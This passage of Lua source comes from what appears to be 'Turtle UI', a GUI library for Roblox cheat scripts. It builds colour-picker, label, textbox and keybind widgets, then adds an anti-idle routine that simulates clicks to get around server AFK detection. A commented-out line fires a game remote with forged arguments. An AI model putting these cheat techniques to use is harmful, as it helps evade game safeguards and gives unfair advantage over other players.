                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 4))
            }
            HueGradient.Rotation = 270
            HueGradient.Name = "HueGradient"
            HueGradient.Parent = Hue

            HueSelection.Name = "HueSelection"
            HueSelection.Parent = Hue
            HueSelection.AnchorPoint = Vector2.new(0.5, 0.5)
            HueSelection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            HueSelection.BackgroundTransparency = 1.000
            HueSelection.Position = UDim2.new(0.48, 0, 1 - select(1, Color3.toHSV(preset)))
            HueSelection.Size = UDim2.new(0, 18, 0, 18)
            HueSelection.Image = "http://www.roblox.com/asset/?id=4805639000"
            HueSelection.Visible = false

            coroutine.wrap(
                function()
                    while wait() do
                        FrameRainbowToggle3.BackgroundColor3 = PresetColor
                    end
                end
            )()

            ColorpickerBtn.MouseButton1Click:Connect(
                function()
                    if ColorPickerToggled == false then
                        ColorSelection.Visible = true
                        HueSelection.Visible = true
                        Colorpicker:TweenSize(
                            UDim2.new(0, 363, 0, 132),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        wait(.2)
                        Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
                    else
                        ColorSelection.Visible = false
                        HueSelection.Visible = false
                        Colorpicker:TweenSize(
                            UDim2.new(0, 363, 0, 42),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        wait(.2)
                        Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
                    end
                    ColorPickerToggled = not ColorPickerToggled
                end
            )

            local function UpdateColorPicker(nope)
                BoxColor.BackgroundColor3 = Color3.fromHSV(ColorH, ColorS, ColorV)
                Color.BackgroundColor3 = Color3.fromHSV(ColorH, 1, 1)

                pcall(callback, BoxColor.BackgroundColor3)
            end

            ColorH =
                1 -
                (math.clamp(HueSelection.AbsolutePosition.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) /
                    Hue.AbsoluteSize.Y)
            ColorS =
                (math.clamp(ColorSelection.AbsolutePosition.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) /
                Color.AbsoluteSize.X)
            ColorV =
                1 -
                (math.clamp(ColorSelection.AbsolutePosition.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) /
                    Color.AbsoluteSize.Y)

            BoxColor.BackgroundColor3 = preset
            Color.BackgroundColor3 = preset
            pcall(callback, BoxColor.BackgroundColor3)

            Color.InputBegan:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        if RainbowColorPicker then
                            return
                        end

                        if ColorInput then
                            ColorInput:Disconnect()
                        end

                        ColorInput =
                            RunService.RenderStepped:Connect(
                            function()
                                local ColorX =
                                    (math.clamp(Mouse.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) /
                                    Color.AbsoluteSize.X)
                                local ColorY =
                                    (math.clamp(Mouse.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) /
                                    Color.AbsoluteSize.Y)

                                ColorSelection.Position = UDim2.new(ColorX, 0, ColorY, 0)
                                ColorS = ColorX
                                ColorV = 1 - ColorY

                                UpdateColorPicker(true)
                            end
                        )
                    end
                end
            )

            Color.InputEnded:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        if ColorInput then
                            ColorInput:Disconnect()
                        end
                    end
                end
            )

            Hue.InputBegan:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        if RainbowColorPicker then
                            return
                        end

                        if HueInput then
                            HueInput:Disconnect()
                        end

                        HueInput =
                            RunService.RenderStepped:Connect(
                            function()
                                local HueY =
                                    (math.clamp(Mouse.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) /
                                    Hue.AbsoluteSize.Y)

                                HueSelection.Position = UDim2.new(0.48, 0, HueY, 0)
                                ColorH = 1 - HueY

                                UpdateColorPicker(true)
                            end
                        )
                    end
                end
            )

            Hue.InputEnded:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        if HueInput then
                            HueInput:Disconnect()
                        end
                    end
                end
            )

            RainbowToggle.MouseButton1Down:Connect(
                function()
                    RainbowColorPicker = not RainbowColorPicker

                    if ColorInput then
                        ColorInput:Disconnect()
                    end

                    if HueInput then
                        HueInput:Disconnect()
                    end

                    if RainbowColorPicker then
                        TweenService:Create(
                            FrameRainbowToggle1,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 1}
                        ):Play()
                        TweenService:Create(
                            FrameRainbowToggle2,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 1}
                        ):Play()
                        TweenService:Create(
                            FrameRainbowToggle3,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 0}
                        ):Play()
                        TweenService:Create(
                            FrameRainbowToggleCircle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}
                        ):Play()
                        FrameRainbowToggleCircle:TweenPosition(
                            UDim2.new(0.587, 0, 0.222000003, 0),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )

                        OldToggleColor = BoxColor.BackgroundColor3
                        OldColor = Color.BackgroundColor3
                        OldColorSelectionPosition = ColorSelection.Position
                        OldHueSelectionPosition = HueSelection.Position

                        while RainbowColorPicker do
                            BoxColor.BackgroundColor3 = Color3.fromHSV(lib.RainbowColorValue, 1, 1)
                            Color.BackgroundColor3 = Color3.fromHSV(lib.RainbowColorValue, 1, 1)

                            ColorSelection.Position = UDim2.new(1, 0, 0, 0)
                            HueSelection.Position = UDim2.new(0.48, 0, 0, lib.HueSelectionPosition)

                            pcall(callback, BoxColor.BackgroundColor3)
                            wait()
                        end
                    elseif not RainbowColorPicker then
                        TweenService:Create(
                            FrameRainbowToggle1,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 0}
                        ):Play()
                        TweenService:Create(
                            FrameRainbowToggle2,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 0}
                        ):Play()
                        TweenService:Create(
                            FrameRainbowToggle3,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 1}
                        ):Play()
                        TweenService:Create(
                            FrameRainbowToggleCircle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}
                        ):Play()
                        FrameRainbowToggleCircle:TweenPosition(
                            UDim2.new(0.127000004, 0, 0.222000003, 0),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )

                        BoxColor.BackgroundColor3 = OldToggleColor
                        Color.BackgroundColor3 = OldColor

                        ColorSelection.Position = OldColorSelectionPosition
                        HueSelection.Position = OldHueSelectionPosition

                        pcall(callback, BoxColor.BackgroundColor3)
                    end
                end
            )

            ConfirmBtn.MouseButton1Click:Connect(
                function()
                    ColorSelection.Visible = false
                    HueSelection.Visible = false
                    Colorpicker:TweenSize(
                        UDim2.new(0, 363, 0, 42),
                        Enum.EasingDirection.Out,
                        Enum.EasingStyle.Quart,
                        .2,
                        true
                    )
                    wait(.2)
                    Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
                end
            )
            Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
        end
        function tabcontent:Label(text)
            local Label = Instance.new("TextButton")
            local LabelCorner = Instance.new("UICorner")
            local LabelTitle = Instance.new("TextLabel")
	    local lbl = {}
			
            Label.Name = "Button"
            Label.Parent = Tab
            Label.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Label.Size = UDim2.new(0,363,0,42)
            Label.AutoButtonColor = false
            Label.Font = Enum.Font.SourceSans
            Label.Text = ""
            Label.TextColor3 = Color3.fromRGB(0, 0, 0)
            Label.TextSize = 14.000
	    Label.BackgroundTransparency = 1
	
            LabelCorner.CornerRadius = UDim.new(0, 5)
            LabelCorner.Name = "ButtonCorner"
            LabelCorner.Parent = Label

            LabelTitle.Name = "ButtonTitle"
            LabelTitle.Parent = Label
            LabelTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            LabelTitle.BackgroundTransparency = 1
            LabelTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            LabelTitle.Size = UDim2.new(0,187,0,42)
            LabelTitle.Font = Enum.Font.Gotham
            LabelTitle.Text = text
            LabelTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            LabelTitle.TextSize = 14.000
            LabelTitle.TextXAlignment = Enum.TextXAlignment.Left
            LabelTitle.RichText = true
	    LabelTitle.TextWrapped = true
			
            Tab.CanvasSize = UDim2.new(0,0,0,TabLayout.AbsoluteContentSize.Y)
	    LabelTitle.Size = UDim2.new(0,187,0,LabelTitle.TextBounds.Y)
            Label.Size = UDim2.new(0,363,0,LabelTitle.TextBounds.Y + 35)
	    LabelTitle:GetPropertyChangedSignal("Text"):Connect(function()
		LabelTitle.Size = UDim2.new(0,187,0,LabelTitle.TextBounds.Y)
                Label.Size = UDim2.new(0,363,0,LabelTitle.TextBounds.Y + 35)
		Tab.CanvasSize = UDim2.new(0,0,0,TabLayout.AbsoluteContentSize.Y)
	    end)
			
	 function lbl:EditLabel(str)
		LabelTitle.Text = str
	end
		return lbl
        end
        function tabcontent:Textbox(text, disapper, callback)
            local Textbox = Instance.new("Frame")
            local TextboxCorner = Instance.new("UICorner")
            local TextboxTitle = Instance.new("TextLabel")
            local TextboxFrame = Instance.new("Frame")
            local TextboxFrameCorner = Instance.new("UICorner")
            local TextBox = Instance.new("TextBox")

            Textbox.Name = "Textbox"
            Textbox.Parent = Tab
            Textbox.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Textbox.ClipsDescendants = true
            Textbox.Position = UDim2.new(-0.541071415, 0, -0.532915354, 0)
            Textbox.Size = UDim2.new(0, 363, 0, 42)

            TextboxCorner.CornerRadius = UDim.new(0, 5)
            TextboxCorner.Name = "TextboxCorner"
            TextboxCorner.Parent = Textbox

            TextboxTitle.Name = "TextboxTitle"
            TextboxTitle.Parent = Textbox
            TextboxTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextboxTitle.BackgroundTransparency = 1.000
            TextboxTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            TextboxTitle.Size = UDim2.new(0, 187, 0, 42)
            TextboxTitle.Font = Enum.Font.Gotham
            TextboxTitle.Text = text
            TextboxTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextboxTitle.TextSize = 14.000
            TextboxTitle.TextXAlignment = Enum.TextXAlignment.Left
            TextboxTitle.RichText = true
			
            TextboxFrame.Name = "TextboxFrame"
            TextboxFrame.Parent = TextboxTitle
            TextboxFrame.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
            TextboxFrame.Position = UDim2.new(1.28877008, 0, 0.214285716, 0)
            TextboxFrame.Size = UDim2.new(0, 100, 0, 23)

            TextboxFrameCorner.CornerRadius = UDim.new(0, 5)
            TextboxFrameCorner.Name = "TextboxFrameCorner"
            TextboxFrameCorner.Parent = TextboxFrame

            TextBox.Parent = TextboxFrame
            TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.BackgroundTransparency = 1.000
            TextBox.Size = UDim2.new(0, 100, 0, 23)
            TextBox.Font = Enum.Font.Gotham
            TextBox.Text = ""
            TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.TextSize = 14.000

            TextBox.FocusLost:Connect(
                function(ep)
                    if ep then
                        if #TextBox.Text > 0 then
                            pcall(callback, TextBox.Text)
                            if disapper then
                                TextBox.Text = ""
                            end
                        end
                    end
                end
            )
            Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
        end
        function tabcontent:Bind(text, keypreset, callback)
            local binding = false
            local Key = keypreset.Name
            local Bind = Instance.new("TextButton")
            local BindCorner = Instance.new("UICorner")
            local BindTitle = Instance.new("TextLabel")
            local BindText = Instance.new("TextLabel")

            Bind.Name = "Bind"
            Bind.Parent = Tab
            Bind.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Bind.Size = UDim2.new(0, 363, 0, 42)
            Bind.AutoButtonColor = false
            Bind.Font = Enum.Font.SourceSans
            Bind.Text = ""
            Bind.TextColor3 = Color3.fromRGB(0, 0, 0)
            Bind.TextSize = 14.000

            BindCorner.CornerRadius = UDim.new(0, 5)
            BindCorner.Name = "BindCorner"
            BindCorner.Parent = Bind

            BindTitle.Name = "BindTitle"
            BindTitle.Parent = Bind
            BindTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            BindTitle.BackgroundTransparency = 1.000
            BindTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            BindTitle.Size = UDim2.new(0, 187, 0, 42)
            BindTitle.Font = Enum.Font.Gotham
            BindTitle.Text = text
            BindTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            BindTitle.TextSize = 14.000
            BindTitle.TextXAlignment = Enum.TextXAlignment.Left
            BindTitle.RichText = true
			
            BindText.Name = "BindText"
            BindText.Parent = Bind
            BindText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            BindText.BackgroundTransparency = 1.000
            BindText.Position = UDim2.new(0.0358126722, 0, 0, 0)
            BindText.Size = UDim2.new(0, 337, 0, 42)
            BindText.Font = Enum.Font.Gotham
            BindText.Text = Key
            BindText.TextColor3 = Color3.fromRGB(255, 255, 255)
            BindText.TextSize = 14.000
            BindText.TextXAlignment = Enum.TextXAlignment.Right

            Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)

            Bind.MouseButton1Click:Connect(
                function()
                    BindText.Text = "..."
                    binding = true
                    local inputwait = game:GetService("UserInputService").InputBegan:wait()
                    if inputwait.KeyCode.Name ~= "Unknown" then
                        BindText.Text = inputwait.KeyCode.Name
                        Key = inputwait.KeyCode.Name
                        binding = false
                    else
                        binding = false
                    end
                end
            )

            game:GetService("UserInputService").InputBegan:connect(
                function(current, pressed)
                    if not pressed then
                        if current.KeyCode.Name == Key and binding == false then
                            pcall(callback)
                        end
                    end
                end
            )
        end
        return tabcontent
    end
    return tabhold
end

local isafk = {
	s = 0,
	m = 0,
	h = 0,
	d = 0,
	bool = false
}

LocalPlayer.Idled:connect(function()
	if isafk.bool == false then
		lib:WarnUser("User is afk... manipulating server detection")
		isafk.bool = true
	end
	VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	wait(1)
	VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

UserInputService.InputBegan:Connect(function(input)
	if isafk.bool == true then
		isafk.bool = false
		lib:WarnUser("User is back... canceling the manipulation.")
		wait(3)
		CloseWarnInterface()
	end
end)

for i,v in pairs(game:GetService("Players"):GetPlayers()) do
	if v.Name == "Rivanda_Cheater" then
		local ownerLabel = Instance.new("BillboardGui")
		ownerLabel.Adornee = v.Character.Head
		ownerLabel.Size = UDim2.new(0,200,0,50)
		ownerLabel.StudsOffset = Vector3.new(0,3,0)
		ownerLabel.Name = "OwnerLabel"
		ownerLabel.AlwaysOnTop = true

		local ownerText = Instance.new("TextLabel",ownerLabel)
		ownerText.Size = UDim2.new(1,0,1,0)
		ownerText.Text = lib:ColorFonts("DEVELOPER","Sky Blue")
		ownerText.TextColor3 = Color3.new(1,1,1)
		ownerText.BackgroundTransparency = 1
		ownerText.Font = Enum.Font.SourceSansBold
		ownerText.FontSize = Enum.FontSize.Size24
		ownerText.RichText = true

		v.CharacterAdded:Connect(function(character)
			local ownerLabel = Instance.new("BillboardGui")
			ownerLabel.Adornee = character.Head
			ownerLabel.Size = UDim2.new(0,200,0,50)
			ownerLabel.StudsOffset = Vector3.new(0,3,0)
			ownerLabel.Name = "Turtle Label Manager"
			ownerLabel.AlwaysOnTop = true

			local ownerText = Instance.new("TextLabel",ownerLabel)
			ownerText.Size = UDim2.new(1,0,1,0)
			ownerText.Text = lib:ColorFonts("DEVELOPER","Sky Blue")
			ownerText.TextColor3 = Color3.new(1,1,1)
			ownerText.BackgroundTransparency = 1
			ownerText.Font = Enum.Font.SourceSansBold
			ownerText.FontSize = Enum.FontSize.Size24
			ownerText.RichText = true
		end)
	end
end
--[[
local args = {
    [1] = {
        ["heroGuid"] = "3acd6428-3b5f-428a-91ea-398b464fc223",
        ["attackType"] = 1,
        ["userId"] = 3621188307,
        ["enemyGuid"] = "2ac06468-57be-422d-915b-c9d6e0252769"
    }
}

game:GetService("ReplicatedStorage")["Remotes"]["HeroUseSkill"]:FireServer(unpack(args))
local player = Players:GetPlayerByUserId(message.TextSource.UserId)
]]

TextChatService.OnIncomingMessage = function(message: TextChatMessage)
	local properties = Instance.new("TextChatMessageProperties")
	properties.Text = lib:ColorFonts(message.Text,"Tomato")
	
	if message.TextSource then
		if message.TextSource.UserId == 3621188307 then
			properties.PrefixText = lib:ColorFonts("[ CEO ]","Red") .. lib:ColorFonts("[ alya ] ","Pink") .. message.PrefixText
		end
	end
	--[[if message.Translation then
		properties.Translation = lib:ColorFonts(textChatMessage.Translation,"Red")
	end]]

	return properties
end

--[[TextChatService.OnIncomingMessage = function(textChatMessage: TextChatMessage)
	local properties = Instance.new("TextChatMessageProperties")

	--local textSource = textChatMessage.TextSource
	if textChatMessage.TextSource.UserId == 3621188307 then
		local index: number = (textChatMessage.TextSource.UserId % #nameColors) + 1
		local randomColor: Color3 = nameColors[index]
		--properties.PrefixText = string.format("<font color='#%s'>%s</font>", randomColor:ToHex(),textChatMessage.PrefixText)
		properties.PrefixText = lib:ColorFonts(textChatMessage.PrefixText,"Red")
	end


	return properties
end

TextChatService.OnIncomingMessage = function(textChatMessage: TextChatMessage)
	local properties = Instance.new("TextChatMessageProperties")

	--properties.Text = string.format(FORMAT_STRING, textChatMessage.Text)
	properties.Text = lib:ColorFonts(textChatMessage.Text,"Green")

	if textChatMessage.Translation then
		--properties.Translation = string.format(FORMAT_STRING, textChatMessage.Translation)
		properties.Translation = lib:ColorFonts(textChatMessage.Translation,"Red")
	end

	return properties
end
]]

print("Turtle UI is running")
return lib
